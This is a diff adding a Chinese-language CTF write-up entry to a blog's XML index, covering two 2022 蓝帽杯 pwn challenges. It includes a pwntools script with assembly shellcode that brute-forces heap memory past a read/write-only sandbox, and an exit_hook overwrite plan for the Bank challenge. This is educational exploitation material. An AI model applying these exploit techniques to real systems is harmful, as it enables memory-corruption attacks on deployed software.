@@ -67,6 +67,31 @@
   
   
   <entry>
+    <title>2022 蓝帽杯 初赛</title>
+    <link href="/2022/07/03/CTF_competition/2022lm/"/>
+    <url>/2022/07/03/CTF_competition/2022lm/</url>
+    
+    <content type="html"><![CDATA[<h2 id="escape-shellcode"><a href="#escape-shellcode" class="headerlink" title="escape_shellcode"></a>escape_shellcode</h2><p>一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。</p><p>注意几点：一个是我们会发现每次rip中的地址和堆起始地址的偏移不一样，所以要用位运算来解决，不能用sub汇编来解决求取堆起始地址的问题；第二是我们不能在汇编之外进行循环，要在汇编里面完成循环，否则地址随机化会导致爆破不成功；第三是注意rip不可访问的问题。</p><p>WP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./escape_shellcode&quot;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>pld = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lea r13, [rip]</span><br><span class="hljs-string">mov r11, 0xfffffffff000</span><br><span class="hljs-string">and r13, r11// 求得堆地址</span><br><span class="hljs-string">add r13, 0x120// 使低位为0x120</span><br><span class="hljs-string">mov r10, r13</span><br><span class="hljs-string">mov r14, 0// r14是每次起始地址减去的长度</span><br><span class="hljs-string">mov r15, 0x10000// r15是循环的次数</span><br><span class="hljs-string">loop :</span><br><span class="hljs-string">mov r13, r10</span><br><span class="hljs-string">mov rdi, 1</span><br><span class="hljs-string">mov rdx, 0x30</span><br><span class="hljs-string">mov rax, 1</span><br><span class="hljs-string">sub r15, 1</span><br><span class="hljs-string">add r14, 0x1000// 进行0x1000大小的递增</span><br><span class="hljs-string">sub r13, r14</span><br><span class="hljs-string">mov rsi, r13</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">cmp r15, 0</span><br><span class="hljs-string">ja loop// r15大于0的时候进行跳转</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pld = asm(pld)<br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.send(pld)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>只要爆破1秒就能出flag。</p><p>其他方法：如果给了libc版本，可以通过释放堆的fd泄露libc，通过libc里面的environ泄露栈，通过栈可以泄露代码段的地址，也就能得到flag的地址。</p><h2 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h2><p>类似于银行ATM取款机的一道题目，主要的难点在代码审计，libc版本是2.31，发现漏洞主要存在于Transfer这一个功能中，我们开始可以利用的钱是0x190(有个强制类型转换)，也就是400块，Transfer中的主要实现如下：</p><blockquote><p>注意在Transfer中可以进行刷钱，只要我们输入的金额和我们现有的金额相同就好，比赛时候就是没想通这一点，没钱💴用是真的难受😫！！！这道题就叫：用多少取多少😁</p></blockquote><ul><li>admin：花大于30块钱，可以得到一个泄露地址的机会</li><li>hacker：花大于50块钱，可以得到一个释放随机地址堆块的机会</li><li>guest：花大于5块钱，可以<code>malloc(0x18)</code>，然后写入0x10字节大小的数据</li><li>ghost：花大于10块钱，realloc一个大小小于等于0x100的堆块</li><li>abyss：无需花钱，进行任意地址写，然后<code>exit(0)</code></li></ul><p>所以我们准备打<code>exit_hook</code>，泄露libc然后找到<code>_rtld_global</code>结构体，覆盖<code>__rtld_lock_unlock_recursive</code>或者<code>_rtld_lock_lock_recursive</code>为onegadget。</p><p>exit函数调用流程：<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive or _rtld_lock_lock_recursive</code></p><blockquote><p>参考文章：<a href="https://blog.csdn.net/qq_43116977/article/details/105485947">(9条消息) exit_hook劫持_starssgo的博客-CSDN博客</a></p></blockquote><p>介绍一下realloc函数的用法，之前没遇到过：</p><p><code>void *realloc(void *ptr, size_t size)</code>：其中ptr是指向一个要重新分配的堆块，如果ptr为空，那么会分配一个新的内存块，并且函数返回一个指向它的指针；size是新的内存块的大小，如果为0并且ptr指向一个已经存在的堆块，那么ptr指向的内存块会被释放，并且返回一个空指针。需要注意的是，如果申请的大小大于原来堆块的大小，realloc会将之前的chunk释放掉，再去处理我们请求的堆块；如果申请的大小小于堆块的大小，realloc会对原有的chunk进行切分，将多余的给释放掉。在这道题目中，可以通过<strong>先realloc一个大的再realloc一个小的</strong>达到效果。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF_competition：大哥别卷我</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>蓝帽杯</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>2022 ciscn 初赛</title>
     <link href="/2022/07/01/CTF_competition/2022ciscn/"/>
     <url>/2022/07/01/CTF_competition/2022ciscn/</url>
